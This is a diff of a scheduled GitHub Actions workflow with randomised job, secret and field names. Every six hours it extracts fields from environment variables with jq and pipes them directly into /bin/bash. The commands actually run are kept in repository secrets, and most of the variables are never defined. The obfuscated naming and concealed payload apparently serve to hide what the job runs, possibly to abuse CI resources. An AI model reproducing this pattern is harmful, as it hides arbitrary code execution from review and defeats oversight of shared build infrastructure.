@@ -3,27 +3,32 @@ name: gaojinbao2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '54 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaojinbao2345
         env:
-          hphmp9746: ${{ secrets.hphmp9746 }}
+          gpej01741: ${{ secrets.gpej01741 }}
         run: |
-          echo $hphmp9746 | jq -r .zkxia5333 | /bin/bash
-          echo $ojkjz153 | jq -r .b7885 | /bin/bash
-          echo $vohzx75 | jq -r .d9021 | /bin/bash
-          echo $ih3 | jq -r .mbs07341 | /bin/bash
-          echo $daf49 | jq -r .bot2489 | /bin/bash
-          echo $c0860 | jq -r .tpfv3 | /bin/bash
-          echo $cczpb6 | jq -r .j5 | /bin/bash
-          echo $us7127 | jq -r .t03 | /bin/bash
-          echo $wgkn7997 | jq -r .lgm40 | /bin/bash
-          echo $onb6 | jq -r .uoltp7 | /bin/bash
-          echo $obqd53 | jq -r .roxxv49 | /bin/bash
-          echo $jtja86 | jq -r .uh4 | /bin/bash
+          echo $gpej01741 | jq -r .pcq7 | /bin/bash
+          echo $ljjvv251 | jq -r .du7226 | /bin/bash
+          echo $itlao460 | jq -r .pru2672 | /bin/bash
+          echo $nys87917 | jq -r .yn72 | /bin/bash
+          echo $a88 | jq -r .k17865 | /bin/bash
+          echo $c60 | jq -r .mhxe147 | /bin/bash
+          echo $uyn9952 | jq -r .jgnyr30 | /bin/bash
+          echo $yl659 | jq -r .r42 | /bin/bash
+          echo $yz22231 | jq -r .ieli9 | /bin/bash
+          echo $wusqr47206 | jq -r .zvd77 | /bin/bash
+          echo $ujzh5455 | jq -r .yo01617 | /bin/bash
+          echo $cn77590 | jq -r .ni527 | /bin/bash
+          echo $qcptz865 | jq -r .wwy97 | /bin/bash
+          echo $xy3074 | jq -r .vkw22 | /bin/bash
+          echo $rpx14 | jq -r .qt76384 | /bin/bash
+          echo $ox241 | jq -r .xr61074 | /bin/bash
+          echo $kywwf509 | jq -r .cfjh7863 | /bin/bash
+          echo $rjvm476 | jq -r .qurho6 | /bin/bash
 
